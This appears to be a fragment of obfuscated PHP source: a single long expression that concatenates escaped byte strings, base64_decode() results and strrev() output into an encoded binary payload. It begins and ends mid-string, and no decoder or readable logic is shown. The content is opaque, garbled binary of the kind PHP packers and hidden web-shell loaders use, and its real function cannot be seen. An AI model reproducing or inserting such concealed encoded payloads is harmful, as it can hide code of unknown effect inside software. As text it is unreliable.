ØÒ,ÀézQ$;„#»òÜGĞæ*µ=µ¢2$)é3Ò\'¹™oìT‰),')."\277\5\226\343\21\106\155\110\233\230\267\162\13\323\22\111\115\176\35\52\231\242\37\57\143\12\231\162\201\333\75\151\331\316\204\107\230\364\345\313\345\54\76\121\370\325\64\334\310\143\266\275"."\x47\x95\xfa\xd2\xc6\xcb\xb\x63\x9e\x14\x1a\xd2\x34\x90\x4\x1a\x24\xb\x5c\xa9\x13\x9d\x68\x49\x63\xfc\x1f\x92\x70\x47\x4a\x6d\x65\x96\x97\xc0\xa0\x70\xc8\x0\x6\x1b\x3f\xd5\xd0\x2d\xb0\xc2\x65\xa3\x4f\xc1"."\10\324\365\350\370\335\23\175\205\22\340\366\30\121\105\152\74\355\353\53\265\113\66\225\307\40\51\145\353\371\241\40\377\140\201\210\236\276\376\203\121\135\160\4\250\32\171\146\366\265\225\4".base64_decode('iSVfIpUksuyoQ9CRPomBmU9BtsAxtBeEI2oL2m4ijGFJm3EbeWe1gIRYiJ9KeMl7Xzg+zg==')."\x26\x1a\x7\xf4\xe\x14\x26\x7b\x25\xa2\xdc\x3c\xc4\xb4\x48\xc0\x90\x97\x60\x14\x7c\xf4\x67\x69\x36\xe9\x46\x1d\x7\xac\x4b\xea\x16\x37\xa7\x44\x1e\x50\x2\xf8\x71\x9f\xa5\xd7\xd2\x59\x4e\x60\x7\x24\x23\xaa"."\132\277\216\137\225\61\341\114\211\2\16\14\245\164\160\320\105\174\173\26\213\264\107\331\115\17\216\143\11\227\32\15\370\227\362\113\27\236\332\344\133\344\114\11\142\11\245\257\271\154\62\227"."\233\341\164\162\100\125\243\21\54\140\14\204\232\34\25\142\55\334\0\257\75\115\15\5\303\13\312\146\40\206\244\125\252\102\23\203\361\100\253\63\315\336\102\54\340\213\62\353\320\70\336\20"."\212\370\245\354\140\244\24\22\234\343\341\211\124\74\111\23\275\347\124\165\256\44\47\246\72\164\160\112\256\302\162\14\267\332\65\251\172\136\347\352\352\252\116\357\74\317\104\56\176\243\344\112".base64_decode('epU7RrLJNp86ZwLet1girQYxr8cDH+EBb6eX2ezyikz4FeVPpz98jwFr7DFqAMnWUYd1EA==')."\366\34\337\343\174\372\245\262\367\136\20\305\357\177\125\276\2\361\45\256\32\133\32\343\163\145\117\263\141\44\305\151\131\341\302\121\30\375\155\223\213\142\135\236\262\5\155\50\155\173\15\55"."\x27\x79\xd2\x86\x58\x2d\x62\x59\x27\x8d\x44\x11\x9b\x5c\x12\x73\x24\xde\x4e\xa3\x24\x8f\xad\x9\x44\xd0\xfb\x84\x8c\x0\x56\x65\x8c\xad\xde\x1c\xda\x2b\x61\x33\xf6\x23\xae\xb5\xb9\x25\x38\x7f\x41\xa8\x35\x1c".strrev('2'."\n".'faU±ÑÇ32½7Dğ‹üK3ö÷_ˆ½iÆ"LÜQé¤1Öil²^-ÛÅ[i').strrev('¸mÀcÎ)œV…SôÍÏŞ¤ÒÇf™7ıÖ¢îF5†w ­¢QÕg6o5´YòŞ¦.x')."\145\327\0\30\155\145\306\61\331\355\140\13\40\101\70\317\220\230\7\221\310\15\114\323\350\220\56\64\14\215\1\311\100\63\133\75\250\72\260\124\140\60\266\31\333\107\145\366\120\127\20\53"."\x97\x4e\x13\x99\x2b\xdc\x5a\x9f\x2d\x5f\x18\x6d\x5e\xe1\x46\x27\x58\x5b\xdc\x61\x26\xf3\x4c\xb2\x15\xb4\x1a\xbd\x85\xc9\x5e\xb\xf7\x33\x87\xb6\xf\xe8\xb\x30\x14\xf2\x6a\x21\x5b\xa\x57\x1d\xc2\x1b\x57\x8b"."\143\255\362\104\156\145\43\106\24\53\353\224\251\140\152\277\11\261\336\111\245\203\162\323\40\377\307\234\30\261\26\117\243\56\105\30\265\146\222\133\273\265\152\266\134\260\220\115\172\343\232\220"."\x6d\x2c\x30\xe2\x9b\xed\x13\xba\x68\xd9\x3e\xae\x34\x92\xb0\x31\x1f\x78\x9f\x6f\x92\x54\xd6\x4\x7f\x1\xfe\x30\x50\x5e\xc3\x10\x53\xc2\x85\x97\xa3\xd\x43\x51\xc9\x3f\x91\xcd\xbe\x85\xec\x41\x44\xcb\xe7\xfd".base64_decode('KTwG2xq2JSXkSA9WdZFVZOwms1F2I2Xykry8KULcBnaPZB27pAXEEOYC7JF8SS7iHtMiew==')."\xff\x7d\x69\x25\xe0\xe5\x85\xe1\x0\x1\x6b\x2\x56\x22\xbe\xf1\x7\x84\x1b\x74\x1b\xa6\xe9\xce\x17\xc\xac\x24\x57\x9f\xce\xf6\x7a\xcd\x1\xc8\xcb\x68\xa6\xb5\xc8\x66\x77\xe8\x6b\xcd\x62\x63\xf3\x1a\xad\x9c".strrev('âN’)Õ=dYv1"ÛuËß	¦Åæú‹ÆÃZ¦6Ä\\>Ø®4-äœU@³V	º.†').base64_decode('YLOtman2cAvUwu4wlfHTsLDXi9h3Xy+2NmLkmJ8b6oFANlee1El3+SN5ydI39oKBljpT/w==')."\223\154\176\43\206\260\227\117\43\261\304\53\133\124\304\40\167\147\155\316\57\350\4\331\55\151\233\272\336\307\324\25\361\154\13\212\122\340\6\317\351\325\257\273\154\202\133\122\100\244\353\111"."\162\212\200\77\7\162\200\24\165\267\0\375\245\77\147\227\353\275\273\40\154\220\243\331\241\316\33\26\350\103\314\126\364\376\315\115\167\66\167\266\166\306\345\341\132\5\255\247\7\165\126\262".strrev('iŸ·)Ã„l¢‚¨»d4{gPÂb'."\r".'y>?n:Q™xµ–gwY6ÇğØLN"LQ\'Ê•')."\x82\x19\xc5\x4c\x92\x9c\x66\xd1\xa7\x8c\xc\x3a\xc8\x8b\x2b\xeb\xd1\xeb\x6e\x1d\xbd\x7f\xd3\xde\x9f\xff\x70\x74\xfd\x1d\xbb\x77\x3c\x3a\x7a\xd3\x23\x34\x9d\x42\xac\x51\xcf\xf1\x79\x1f\xbd\x6c\xe3\x9e\x47\x6f"."\336\273\355\347\357\136\267\155\337\316\313\367\156\177\30\253\44\335\162\7\325\120\32\271\362\202\321\115\367\216\134\271\156\357\203\27\215\76\262\141\364\346\13\337\275\176\303\73\77\270\0\126"."\x4e\x8e\x58\xc\xf5\x15\x7a\x8b\x2\x4e\xb4\xca\xe8\xad\x3b\x47\x76\x5e\xf9\xee\x35\xd7\xef\xdd\xbe\x5d\x2a\x6f\x61\x85\xb9\x8c\xb4\x74\xd0\x2c\x8e\x5c\xbc\xe6\xdd\xb\xef\x1a\xb9\xf2\xaa\x3d\xd7\xdc\x52\x52"."\201\176\300\71\317\170\170\233\56\331\163\303\105\122\216\263\122\3\261\242\56\216\360\274\16\315\30\331\160\305\236\37\337\353\254\104\315\352\227\251\64\172\355\332\335\217\76\344\250\24\66\142"."\305\104\252\101\62\327\76\172\371\332\221\155\67\360\217\354\336\161\5\325\125\167\124\341\52\162\274\74\155\277\264\174\214\141\164\243\241\233\150\37\155\325\254\4\54\342\75\133\37\107\375\241".base64_decode('EJNnbmT7xXtuPX/P1kthJjZvH9lw5+jWLXtu28abBayyaeviBu67YO9Da0ave4gXxEs+qQ==').base64_decode('iDIEo2gZrJdPPrjnsav2PHoTRpJ1F+y54GcjN907cvMP+GdHduwQUI54iR+wMsR2IU4Hcg==')."\333\43\24\272\363\105\311\201\236\114\340\60\113\306\165\74\261\220\212\172\100\140\234\26\161\126\0\216\164\352\331\242\105\160\314\65\30\111\200\375\312\12\104\72\53\352\52\316\250\102\277\325"."\25\256\12\174\0\41\161\114\74\161\2\351\107\105\335\31\125\44\120\15\6\217\206\141\337\220\254\36\213\205\7\242\333\171\210\172\110\27\234\363\310\66\204\67\271\311\336\311\136\266\361\315".strrev('RŠá¸sª=@/rú€„ÖFûIKì=™<÷¬‚Œ·Xh-ØK~¡çtƒğFıóµ_Ü(¿[')."\244\203\12\335\124\263\330\126\374\341\237\216\254\271\377\335\353\266\72\313\122\301\12\224\305\354\131\211\307\107\372\230\143\344\252\315\245\337\43\345\355\137\143\205\107\316\277\151\317\65\216\222"."\x4c\xd1\x56\x91\x24\x68\xa2\x2\xc1\x7e\x7\x1d\xe1\xfb\x82\x5c\x85\xe2\xfb\xff\x66\x15\x51\x79\x66\x1d\x96\xec\xd3\x84\x25\xee\xf6\xfc\x50\x31\xe7\xc6\x12\x2e\x77\x4c\xb6\x85\xe9\x70\x1\x54\x63\x2f\x8f\x65".strrev(']V/èåœÎÕ¹‚ºxElK¬ÃH\'Õ1±ºOò&÷&vE:¢k©Vnû¿2òöT')."\161\43\26\37\257\61\264\160\255\264\144\251\137\56\142\367\104\345\364\117\345\204\2\251\202\5\246\156\331\67\326\40\72\241\341\154\354\326\304\215\305\257\156\146\354\263\64\107\20\216\262\135".base64_decode('TYA/hHJF2ovppPOTREXHXSyyD5ZtVD4/sgJkEEHens2jh4bmmt8wOh2GiMO3VurWYmk2qQ==')."\x4c\x9e\x52\x37\x6d\x56\x1d\xb3\x4c\x73\x26\xd3\x30\x2a\xe6\xd9\x73\x1\x14\x64\x6e\x2f\xc6\x7b\x7b\x18\xad\x11\x9e\xa5\xd8\xd8\xf0\x84\x4b\x5e\x58\x6c\xc9\x2\x8c\xdc\xc9\x5\x23\x52\xb6\x72\xa2\xb7\x36\xbf"."\x68\x30\x50\x2a\xfb\x91\xdc\xc6\x90\xbb\x1f\x4a\xa2\xb0\xde\x9d\xca\xdd\xeb\x94\xa1\xd6\x69\xe6\x3a\x49\x72\x54\xc9\xe7\xa1\x97\x5\xa\xfc\x88\xaf\x89\x95\xd1\x9d\xe9\x13\x3\x20\x64\x5\x10\xbb\xf\xf5\xcf"."\20\7\45\302\242\112\4\41\221\52\346\372\352\245\114\305\62\14\45\253\345\206\340\374\71\301\254\233\140\316\306\37\252\307\117\101\314\11\314\267\22\336\230\204\171\117\152\141\12\162\350\265"."\x96\x7\x7b\x46\xf3\xe0\x5d\x2f\xca\xde\xe1\xb6\x11\x9a\x4e\xc3\xe0\x97\xa\x32\x42\xed\xcd\xc1\xb0\xa4\xb\x28\x25\xa8\xfe\xc6\xb0\xea\x6b\x6b\x2b\x9b\x1\x60\xa7\xc2\x66\xac\x48\xe3\x59\x2e\xb9\xc5\xa4\xa1"."\71\350\350\245\44\360\143\243\372\12\234\132\241\230\205\4\263\201\135\341\5\325\62\122\100\160\101\163\322\120\245\22\127\121\172\20\116\270\111\210\146\127\316\235\343\115\103\115\217\367\164\114".base64_decode('o71YqS53Jp46WceHpDYJI12KMkdTKLjqK8nVSaWSQvs41yie66zMXZnN8WpyJl4tUYOdDw==')."\xf9\x99\xbc\x9f\x9b\xb3\x2c\x7b\x6b\xe6\x93\x4c\xe4\x13\xd7\x42\x7e\x2d\xb7\xa8\xb4\xa\x6e\xdc\x93\x90\xb3\x98\xcf\xc9\x14\x91\x25\x38\x6e\x60\xe7\xe4\xe7\xce\xc1\x97\x3d\x4c\x6d\xcf\x4b\x22\x73\xbc\xf9\xb9"."\362\154\223\27\141\245\37\363\22\121\222\127\310\56\124\352\35\264\374\25\45\277\231\53\203\107\130\305\6\41\77\323\155\320\22\175\30\21\305\26\1\335\200\214\66\54\211\240\31\66\347\41"."\x96\xa4\x15\x55\xc4\xf\x23\xc9\x3d\x4f\x41\x38\x5d\x5b\xb9\x92\x36\x84\x1d\xe3\xac\x5e\x5d\x9a\x6\x7a\xd6\xce\x2c\x5f\x3e\xed\x4c\xc2\x8\xe7\x4c\xc3\x12\x21\x91\x86\xf6\x3a\xfb\x67\x28\xb2\xcb\x85\x44\xa"."\53\103\177\105\235\120\270\131\104\350\131\336\226\331\301\64\244\110\254\263\243\322\63\161\365\152\157\232\151\43\62\115\50\126\327\303\113\323\170\247\307\136\36\215\4\100\317\13\102\202\263\44"."\105\252\371\200\105\107\170\47\212\307\234\134\353\120\301\252\210\365\365\163\73\70\173\325\305\362\124\42\110\221\347\216\261\247\351\332\231\14\51\320\371\61\276\230\7\375\141\301\200\363\145\104"."\11\223\207\210\364\174\166\243\334\363\204\137\72\12\147\71\354\313\347\155\24\210\105\360\245\127\46\335\355\345\144\203\136\204\171\22\342\265\44\53\102\210\226\43\35\53\21\72\62\260\17\144".base64_decode('ktyPqKpR4GSOp6O2eCKgOSZFEuXh2XPMRCGdt2xkkDqGriAuzJZr/RotUqGAuK6+gnikqA==')."\100\113\232\346\60\332\307\73\70\7\177\15\361\304\231\372\12\62\10\63\245\353\250\76\41\155\345\76\202\52\126\50\214\370\146\65\16\307\202\145\240\115\224\77\276\3\217\221\355\121\170\264"."\xe4\xb\xc3\xf5\xe3\xe9\xe7\xd0\xdf\x33\x4e\x67\x98\x44\xdc\x59\x66\x10\xb3\x4c\x9e\x64\x10\x32\x47\x38\xf2\x1e\x2c\x86\xa5\x85\xc0\x73\x65\x5b\x34\x12\x8f\xf8\x99\xf7\x37\xbb\xbc\x96\xa6\x4d\x65\xa7\xb\x93"."\276\73\25\7\62\366\242\216\153\42\261\22\234\255\360\102\12\140\103\241\230\313\161\45\120\214\257\174\73\254\57\377\137\7\271\41\325\223\135\143\344\53\35\32\273\77\5\241\62\275\20\146"."\257\106\241\237\150\343\215\343\67\364\46\44\113\46\77\261\301\121\75\351\351\240\226\0\352\153\330\263\52\246\162\52\36\134\262\222\162\216\202\167\222\56\16\165\264\376\275\100\76\305\312\252".base64_decode('xFd+4J+p0lVZ5ZlYXVmaQ5V77flYc06dH0OZ4A0pTtPJu0V/KBgIx9UgMAO1k2d4asSbwg==')."\xb4\x29\x4c\xe8\xd2\xb0\x5f\xb6\x6f\x80\xa1\xea\xb1\xd\xab\xc\x68\xe8\x9d\x4b\x9c\xab\xa6\xea\x39\x9b\x8\x96\x82\x34\x63\x30\xe3\xae\x93\x6b\x6a\x6a\xdc\x35\xb5\xe8\x7f\xf6\xd6\x82\x99\x94\xac\x63\x46\x3c"."\xa4\x22\x35\x35\x75\xe4\x7f\x9a\x41\xee\x3d\x0\x5\xed\x39\x88\x24\x32\x5a\xe\x5\x6\x74\x1d\x3a\x4\x7b\x27\x3a\x22\x17\x19\x23\xda\xe1\xc7\xaf\x45\x15\xdc\x35\x98\x16\xa1\x5a\x8b\xb0\x8f\xd8\x5c\x65\x64"."\325\346\133\123\41\367\377\20\323\5\20\262\222\77\310\30\330\350\355\265\141\73\273\36\240\366\270\341\243\350\340\225\353\45\0\202\276\363\207\310\250\230\130\101\263\351\363\360\172\336\301\100"."\56\331\41\177\314\303\0\115\23\205\55\172\67\313\160\313\56\141\240\22\45\172\342\376\320\326\65\124\307\156\330\25\247\40\246\50\301\307\214\23\44\121\55\346\170\45\143\265\70\52\137\23"."\x92\x6c\xfe\x9a\x97\xc4\x32\xdc\x6\x9\x8e\x86\x79\x4b\xd4\xf3\x10\x75\x45\xf\x30\x2c\xb3\x22\x53\xc6\x80\x2a\xf8\x14\x1c\x9d\xcf\x63\x4\xa4\xf8\xc8\xc9\x50\x32\x29\xbd\xb8\xc6\x70\x65\xfb\x93\x54\x9c\x2b"."\xb3\x9\x4d\x20\x60\xe0\x88\x61\x8d\xbe\xb4\xdd\xf0\x87\x2a\x55\x95\x61\x3b\x1b\x17\x64\x23\x89\xdb\x6b\x62\xc7\xc7\xb8\xa3\x6e\xdc\xef\x3a\x1\x45\x44\xdf\x7c\xdc\x27\x13\xd5\x7d\x66\xfd\x55\x80\xe2\xd0\x28"."\261\126\117\75\376\22\301\116\335\21\45\23\156\71\47\233\314\233\355\266\303\251\125\310\142\322\354\261\13\260\330\327\50\376\261\224\0\113\240\127\167\176\156\351\125\152\300\231\345\250\343\243".strrev(''."\r".')‚a£òz¡:_£kv„:	™‚’ReJô6Zºn~®›J;§S,^¹4´½ %f÷').base64_decode('pbeVT+bFS0uWKcR7L5eTE/FFJnMlDqgljBpoSb55SkVjwoS3SLSvcCnDz12nyYn46Cvrcw==')."\221\123\207\275\15\174\246\266\247\360\236\355\7\351\230\10\304\2\77\363\262\12\64\55\46\250\24\26\117\311\216\55\125\33\232\60\134\145\352\143\30\102\102\121\303\236\116\323\250\220\302\166"."\73\34\47\304\57\243\63\267\367\64\225\56\52\334\100\210\171\102\216\331\354\242\3\232\302\322\255\257\227\253\331\363\336\276\370\52\26\270\232\225\302\140\345\316\104\345\173\70\14\122\125\226"."\x1f\xe1\x15\xdd\xc2\x3d\xab\x97\x41\x44\x3b\xb2\x95\x60\x15\xd9\xd7\x71\x3\x75\x9c\x2c\x49\x31\xdc\x3a\xbb\x2\x45\x87\x6e\x93\x4a\x43\x5d\x38\x59\xa1\x1e\xba\x15\xec\x77\x7c\xbc\x7d\x7e\x4a\x2b\x80\x3\x33".base64_decode('A3GX2Gy0XAm31e4gUQs4lcQx3lfK2jHVV2WCZzKo5U5grksojRbKF16bwN+DUArzWmzjRw==')."\143\355\102\347\43\370\222\330\11\72\50\331\146\37\302\343\200\120\222\115\232\142\337\206\245\115\105\221\33\102\333\163\74\205\5\103\135\12\351\373\154\342\15\243\114\56\266\345\301\276\306\355"."\x6a\xc3\x76\x80\xca\x18\x16\x3f\x53\xe3\xe6\x7d\xcc\x47\x36\x8e\x84\x64\xa6\x38\x4e\xab\xb8\xe7\x8a\xae\xda\xd4\xd\x24\x9b\xfe\xbc\x28\xea\x6\xeb\xbc\xc6\xfa\x46\xf4\x4b\x89\xef\x4\xe9\x98\xef\x88\x3a\xb5".base64_decode('cXENiQ1CUWmLJgyCxfZ45jlBaLGSoKDKb2++mAXWCOSKScqPZfoHrfI2cQ9yQokWOJ2Cng==')."\60\12\111\274\113\112\326\163\162\126\124\357\225\243\104\263\201\55\21\141\165\135\156\2\33\52\223\150\21\136\232\276\204\125\224\315\236\111\216\31\120\114\362\335\41\161\257\356\132\205\263\275"."\x2a\x6d\x99\x46\x26\x49\x19\xa4\x7c\x39\xe\xd8\x21\xde\x95\x1e\xc6\x11\xe9\x57\xac\xd8\xcd\x2f\xaa\x1d\xbc\x28\x7b\x6b\xa7\xc8\xac\x1e\x7b\x3c\x87\x1b\x20\x16\xa7\xf0\x8\x4c\x39\xf\x35\x8b\xd\xa2\x8b\x91"."\311\125\310\67\113\252\320\74\314\155\211\127\166\162\216\211\135\160\264\263\131\54\227\123\346\123\44\113\202\150\202\263\337\0\35\1\44\310\30\322\231\372\267\273\166\262\233\231\13\224\137\336".base64_decode('sRMdjeHTpoQG+EzMaBsoT0M5UcaQrvyJjSdhsoaYreLzSexb8VhBYjCEo3tiAEqm9UKbiQ==').base64_decode('6lvjAu3l8imEcHajTUPeUQCtD3s++NgQnaE2qAybxqKjEfAFI3sRIbXEOMQzApRkUE8eEg==')."\140\204\126\26\65\215\305\336\111\160\42\47\222\343\6\117\54\325\354\302\130\11\115\122\23\5\160\114\256\252\306\46\12\154\42\312\326\41\376\220\34\153\115\342\235\233\353\305\233\162\204\345"."\162\344\64\155\21\252\45\152\253\315\223\170\251\1\235\131\33\140\307\373\266\226\66\57\117\152\340\313\223\112\127\204\345\75\77\123\305\324\7\165\70\11\16\144\323\11\45\24\151\16\372\175".strrev('È¿S2‡äÂáÑ»ºUÜİë†4ù}³Ä6·'."\n".'j­–J®ê"†…i¯‹Òl`Æ¡')."\241\61\341\213\317\336\54\305\112\275\120\322\142\16\77\25\314\224\324\301\122\367\62\245\63\102\150\54\25\316\27\364\322\362\103\72\326\224\224\172\54\125\50\226\351\15\224\57\377\5\342\347"."\x47\x2e\x8d\x78\x26\x3d\x37\x56\xe7\xd3\xb9\xfe\xb4\x99\x16\xe4\x80\xd5\x18\x92\x5b\xf7\x35\xb6\x6\xc3\xaa\x2f\x14\x8a\x2c\xb6\x69\x1a\x8b\xfb\x86\x2\x97\xbe\x24\x65\x37\x4d\xd2\xcc\x88\x49\xa0\x5f\x2f\x35".strrev('ûE¢‘éš†óc&Zw×…ªüz)u6–‚ùj7%F…{îY]hªÙ>‰?döFû').strrev('®%Î†êÊiOùÂ›ìºeø²İMi™\'LXRtÕÜø–æÁ¢ØïÜ#K'."\0".'ı*Sö[~')."\27\125\142\76\215\71\272\64\310\131\12\30\175\232\26\214\250\104\222\256\212\117\40\56\246\60\224\227\257\165\275\111\150\1\133\106\15\260\247\106\70\42\16\63\270\24\64\202\277\102\217\270".base64_decode('6OSOpZDs2MMkeoiMAMBtepkOP3pOhXubl7ySbxDPKzSvA48ClewSY0Ix7mlJVHXmlOkAyg==')."\126\204\154\214\27\120\352\225\32\352\322\221\173\321\121\346\60\173\22\342\3\304\216\141\40\233\267\154\307\377\26\371\361\215\64\45\64\1\13\212\12\134\352\107\347\234\105\361\304\262\13\150"."\103\225\367\116\102\207\305\241\20\253\154\32\331\241\222\4\233\30\55\304\106\303\225\247\261\347\241\134\217\41\103\235\320\163\374\376\212\172\152\245\322\11\27\72\217\350\126\251\353\67\132\375".strrev('nˆR€x•rW³Üû ±V“°y³±úqN+}İ€ÆRí^Ã—‚ŸîtÈv”ínfIŒÍ"¦ÿ')."\5\21\43\230\173\254\370\303\116\277\244\260\364\351\11\364\247\23\176\331\156\350\354\4\245\163\360\311\152\216\212\376\124\72\223\54\160\225\56\221\320\252\13\221\4\251\205\10\113\136\143\276"."\306\211\207\113\30\56\167\72\125\316\271\41\266\136\152\367\235\45\134\222\211\255\327\356\242\211\353\21\230\142\11\231\226\315\51\130\334\210\153\275\56\212\252\230\50\212\130\303\220\34\226\25"."\xfa\xc9\x28\x50\x26\x13\x1b\x26\xf9\x7c\xcf\x95\xa\x30\x17\xa1\x49\x17\xf1\x5f\x49\xe9\xa2\xd3\xab\x95\xb4\x3e\x39\xf9\x95\x6b\xf7\x12\xb3\x9d\xa0\x6f\x68\x7b\xad\x57\x40\x47\x34\x9d\x6d\x21\xb6\x62\x34\xc9"."\253\345\363\342\22\105\336\161\321\277\266\207\330\220\327\36\157\121\211\151\22\225\52\106\304\4\316\111\27\233\64\21\56\71\213\271\40\275\314\261\245\26\244\303\243\154\40\232\136\360\210\367".strrev('nœñTfÊƒº|ˆNÄ+ªºø…ª¬y[ÒŞØÏÄz#È;-Ù&äÀèŞ³õP¼')."\x25\xb6\x35\x8d\xb1\xa\x71\xdb\xd4\x59\x28\x21\x1a\x32\x71\xdb\x4f\xaa\xe4\x7c\xd\x9c\x92\x96\xf3\xa5\x46\x17\x1\xf9\x69\xd4\x7b\xf8\xa1\x9\xc7\x5\x9b\x20\x5b\x5a\x12\x4a\x3d\x4e\x7f\xa1\xa5\xbe\x4f\x99"."\237\123\266\212\300\311\151\31\317\245\143\72\76\165\211\127\334\373\163\321\46\336\14\333\175\330\343\161\160\46\203\237\113\112\216\66\316\123\15\7\253\243\102\324\11\344\270\121\52\224\26\52"."\14\66\267\254\322\250\201\312\225\272\166\225\300\40\215\273\130\310\270\210\66\207\213\51\120\226\365\16\153\163\30\347\234\320\62\376\145\277\266\101\170\74\101\16\165\111\73\1\254\233\323\135"."\x60\xd7\xde\xce\x62\x69\x1b\xee\xa2\xbd\x58\x3c\x24\xa4\x36\xa0\x4b\xf6\x8a\xa5\xd9\xe4\xe4\x29\xd3\x66\xc9\xc2\x13\x31\x85\xe2\x32\x98\x39\x87\xa0\x3f\xc0\xee\x8\xa4\x50\x6c\x60\x70\x29\xcc\xf0\xb4\x4c\x8"."\110\246\375\65\116\251\53\142\307\146\360\237\55\30\161\16\241\105\45\45\337\122\157\355\45\20\40\170\52\151\237\111\173\243\103\157\310\300\252\74\246\130\165\164\67\24\16\210\355\337\242\234".base64_decode('RJlxiM9Ki4U6lTUy+AyfxRcGVkGzH03LncAIJNhxD8t8RcyuiAXSGpEtHdHkFi3DKWrC1Q==')."\361\26\111\304\246\221\134\6\166\160\154\342\102\254\66\211\22\375\7\23\310\116\133\364\140\46\64\320\360\360\155\207\164\73\24\274\147\61\62\123\306\161\260\244\160\263\237\61\120\246\217\237".strrev('>ò²úìÚáóÄ¢¸ÂÂÿ$üå*c)rèÚ&ª<ÑÛ¶q6L„VêUS–åšİ2')."\xda\xce\x3d\xc9\x3e\x4c\xc9\xe3\x62\x61\x1b\x88\x2c\x5d\xdb\x32\x96\xec\xbc\xcb\x8f\x73\x49\x43\xf2\xfa\x28\x6d\x5a\xf2\x8\x2b\x24\x50\x44\x64\x5\x23\x82\xc5\x4d\x34\x30\x48\x37\x7d\xcd\xfc\x69\xb7\x26\xa9"."\x13\xda\xc5\x62\xc0\xe7\x49\x9e\xd0\x11\xf8\x24\x67\xe1\x86\x1c\x96\x3c\xd\xa3\x3d\x21\xc2\xde\x5e\xa0\xee\xd8\x4e\xb4\x28\xde\xe8\x70\x24\x4f\xe8\x97\xd3\xbb\x3c\x83\x19\x21\x1a\xc2\x2d\x36\x61\x82\x27\x2"."\373\53\33\20\260\235\241\270\313\114\333\231\312\164\372\315\105\74\242\315\133\111\262\304\113\71\220\121\362\16\217\176\115\332\210\131\27\173\245\120\270\230\25\21\111\324\114\16\142\74\323\146"."\x67\x1\x1b\x14\x74\x50\xc\x66\xbd\xc1\x74\x78\xe2\xa6\xb6\xca\x69\x98\x9d\x17\xfe\xd7\x2e\x63\xff\x5f\x79\x8a\x9d\x56\xc3\x2e\x5\x6c\xce\xe9\x9b\x81\x6b\x87\xde\xe2\xeb\x58\x2e\x4\xa1\x2\x69\xc7\x38\xec"."\233\355\70\300\51\4\174\117\277\40\61\44\316\365\321\231\121\111\146\153\122\143\267\165\132\46\43\155\311\345\317\71\45\256\300\21\52\366\161\337\317\345\42\316\127\306\116\267\340\35\104\36"."\314\374\172\167\11\252\202\323\312\125\223\235\11\73\34\211\223\266\120\212\324\12\127\131\204\302\354\304\303\316\145\145\26\4\115\142\354\270\40\165\271\164\242\257\314\235\75\121\336\265\73\51".strrev('Ê%µÉ¶ã5BT–ÏôÊ€OFğ].l5k£³É@6A¦ÜbRÀ”,Ãúâ5ˆû¢b’x')."\363\46\110\233\207\341\205\255\106\253\303\327\61\55\304\254\32\203\112\206\104\246\113\125\70\112\153\163\202\42\127\301\357\11\354\302\67\74\255\270\143\356\32\267\43\241\326\355\150\216\273\173".base64_decode('ti8am/9hqvaCVloUC1mYsI1capErb3dpHbpAYqLMGEu0PKHgnRICRxyS4cEITlvBIPynPQ==')."\225\13\236\44\65\356\204\44\325\165\262\224\64\171\202\107\36\210\174\355\153\277\73\302\172\204\342\62\65\36\211\6\324\305\101\154\54\43\170\166\240\235\31\173\116\33\304\77\12\153\262\275"."\xb5\x8a\x3c\xa6\x83\x5\x80\xe\x47\x4d\x86\x40\x25\x1d\x51\x45\x4b\xac\x4f\x61\xb1\xd8\xca\xe6\xfd\xfc\xea\xd7\xfe\x1c\x5b\x7a\xc1\xc1\x2c\x85\xc9\x42\x4f\x7b\x61\xfc\xfa\xc6\xbe\x16\xe7\x96\x2b\x96\x30\xa".strrev('2³©›Šq'."\0".'*rS_©Éyò‚µı®”Íjc¡QÛù‚¤ô°²‡=½IÙFå9¹‰–Óîl¦')."\145\353\31\324\262\117\271\74\204\233\61\313\206\104\302\271\216\323\251\116\223\315\152\126\235\44\204\125\210\375\60\360\256\64\306\334\204\15\277\340\130\34\171\230\64\214\235\213\17\275\374\176"."\233\71\134\301\52\174\136\154\136\14\77\61\361\22\374\3\331\371\122\65\253\46\151\120\305\242\6\41\73\42\24\267\364\250\11\137\262\12\103\221\102\64\33\56\61\273\147\177\55\46\325\47".base64_decode('EiUqJLLJikBjQU6SbvDRKS9pd2NGMkkyszsOLUh30HYVAP4Qt2SrLaZDUjapxezXol9sTw==')."\40\50\314\77\221\154\172\217\346\353\327\270\205\65\147\255\166\333\11\132\122\30\110\20\32\22\50\275\23\26\127\325\22\333\312\252\341\43\270\340\41\34\351\22\315\25\273\242\326\57\230\160".strrev('¡>•§Pâú¤B†M,±À<NPëùô‚/	EáJBÓº“E2ş´›&Lq')."\x81\xf6\xea\xb2\x21\x12\x8e\x54\x22\x89\x3a\xa4\xe2\xda\x35\xd2\x81\x1b\xab\x1f\x9\xb5\x1b\x3a\x14\x2e\x57\x12\x9f\xb4\x9b\x3d\xe1\xc5\xf8\x9c\xa1\x32\xe4\x69\xa0\xdb\x96\xea\x10\x21\x60\x11\x1e\x63\x39\x1d"."\x59\x20\xd4\x92\x9a\x2f\x2b\xfb\x92\x50\x40\xcf\x84\xa4\xe6\x64\x1d\x81\x31\x2b\xc4\xca\x7f\x44\x60\xa5\x1d\xc4\x92\xbd\x18\x91\xc1\x98\x1a\xb9\x15\xdb\xae\xc6\x7\x6\x25\xa3\x72\xa6\xad\x3b\xce\xa9\x25\x27"."\136\201\276\64\61\113\256\22\150\236\317\236\105\313\353\216\336\313\25\234\43\243\65\154\36\14\345\364\201\264\225\110\111\307\363\322\314\322\364\102\11\260\241\3\345\307\341\354\55\203\265\123".base64_decode('aCEaKemPpIAUN8rUoT0qW41m4ZriHGSrOwYIcF2aheuWZLPKJXAl9SytaI4xvFLggRAsWQ==')."\x66\xc0\x42\x54\x24\x15\x1d\xb\x9e\x65\xb\x97\x7e\xe\x30\xd1\x59\x9a\x48\xcd\xca\xf7\x42\x8\xbb\x1c\x2a\x1f\xe5\x7a\x51\xb6\xf0\x98\xbd\x70\x96\x16\x5c\x9\x3e\xec\x96\xcb\xb1\xe9\x4d\xd9\x77\x94\x72\x74"."\233\345\224\241\324\224\12\215\251\120\45\224\214\112\267\14\221\127\106\345\211\176\22\363\107\262\51\312\62\331\262\376\124\171\15\253\150\131\52\143\332\125\237\34\351\62\200\300\220\72\215\60"."\25\111\304\244\145\322\314\145\261\364\4\5\4\34\134\117\263\57\147\360\355\51\51\324\211\61\157\345\53\70\341\134\322\232\35\365\163\105\311\170\175\331\27\61\56\54\221\52\225\366\144\64"."\xfe\x4c\x51\x68\xdf\xd1\x53\xb5\x61\xa5\x13\xba\xdd\x42\xbe\x6c\x91\x92\xe6\xb3\x8f\x64\x24\xf9\xb7\x43\xf4\x2c\xe4\x63\x36\x25\x9c\x32\x2\x59\x92\x44\x83\x1e\